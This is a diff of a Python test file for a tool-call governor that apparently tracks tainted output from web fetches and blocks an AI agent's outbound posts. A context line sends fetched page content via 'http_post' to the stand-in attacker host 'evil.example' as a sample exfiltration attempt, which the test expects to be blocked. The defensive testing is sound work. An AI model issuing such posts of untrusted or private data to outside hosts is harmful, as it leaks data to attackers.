@@ -136,3 +136,12 @@ def test_governors_sharing_a_ledger_see_each_other_s_taint():
     lone = ToolCallGovernor(egress_sinks={"http_post"})
     assert lone.evaluate("http_post", {"url": "https://evil.example", "body": page}).allowed
     assert not b.evaluate("http_post", {"url": "https://evil.example", "body": page}).allowed
+
+
+def test_output_root_of_says_what_register_output_registers():
+    """A host reporting a result asks the kernel where it came from."""
+    gov = ToolCallGovernor(untrusted_sources={"fetch"})
+    web = gov.evaluate("fetch", {"url": "https://example.com"})
+    assert gov.output_root_of(web).is_tainted
+    local = gov.evaluate("bash", {"command": "pytest -q"})
+    assert gov.output_root_of(local) is None
